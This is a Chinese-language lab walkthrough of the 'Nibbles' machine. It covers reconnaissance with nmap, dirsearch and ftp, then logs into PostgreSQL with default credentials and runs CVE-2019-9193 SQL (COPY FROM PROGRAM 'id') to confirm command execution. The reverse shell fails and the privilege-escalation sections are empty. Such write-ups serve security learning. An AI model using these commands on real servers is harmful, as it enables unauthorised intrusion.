---
icon: check
description: Medium / Linux / PostgreSQL命令执行 / CVE-2019-9193
---

# ✔️ Nibbles

## 建立立足点

### 信息收集

* 使用Nmap对目标系统的开放端口进行扫描：

```bash
nmap -sC -sV -p- -oA nibbles 192.168.215.47 --open
```

<figure><img src="../.gitbook/assets/7 (1).png" alt=""><figcaption></figcaption></figure>

* 扫描的同时可尝试直接使用IP地址登录查看是否有Web页面，很幸运有，但是好像没有什么特别的信息。

<figure><img src="../.gitbook/assets/1 (12).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/2 (10).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/3 (12).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/5 (12).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/6 (12).png" alt=""><figcaption></figcaption></figure>

* 使用dirsearch检查是否有隐藏文件/目录，没有：

```bash
dirsearch -u  http://192.168.218.47 -x 403,404,400
```

<figure><img src="../.gitbook/assets/4 (12).png" alt=""><figcaption></figcaption></figure>

* 根据Nmap的扫描结果，发现21端口正运行着FTP服务，尝试匿名登录，失败：

```bash
ftp 192.168.215.47
```

<figure><img src="../.gitbook/assets/8 (1).png" alt=""><figcaption></figcaption></figure>

### 漏洞查阅

* 在5437端口上正在运行的是PostgreSQL 11.3-11.9版本的服务，搜索公开已知的漏洞发现了一个远程命令执行的漏洞正好适用于当前版本：

<figure><img src="../.gitbook/assets/9 (1).png" alt=""><figcaption></figcaption></figure>

* 下载下来查看脚本使用说明：

```bash
searchsploit -m 50847.py
python3 50847.py -h
```

<figure><img src="../.gitbook/assets/10 (1).png" alt=""><figcaption></figcaption></figure>

### 漏洞利用

* 脚本利用始终失败，但是该端口运行的postgresql服务有弱口令登录，用上述脚本中的默认凭证可以成功登录该服务：

<figure><img src="../.gitbook/assets/11 (1).png" alt=""><figcaption></figcaption></figure>

```bash
psql -h 192.168.210.47 -p 5437 -U postgres
```

<figure><img src="../.gitbook/assets/12 (1).png" alt=""><figcaption></figcaption></figure>

### GET SHELL

* 根据上述搜索出的利用脚本得知漏洞为CVE-2019-9193，搜索找到可手动利用的步骤：

<figure><img src="../.gitbook/assets/13 (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/14 (1) (1).png" alt=""><figcaption></figcaption></figure>

* 验证结果说明目标确实存在着命令执行漏洞：

```bash
\c postgres
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec; 
```

<figure><img src="../.gitbook/assets/16 (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
本例尝试用手动利用和脚本利用均无法成功反弹shell，暂不清楚原因先搁置...
{% endhint %}

<figure><img src="../.gitbook/assets/17.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/18 (1).png" alt=""><figcaption></figcaption></figure>

***

## 权限提升

### 本地信息收集

### 漏洞利用

### ROOT

{% hint style="info" %}


(本例机器中途重置过，IP地址有变，不影响漏洞利用及其实现结果)
{% endhint %}
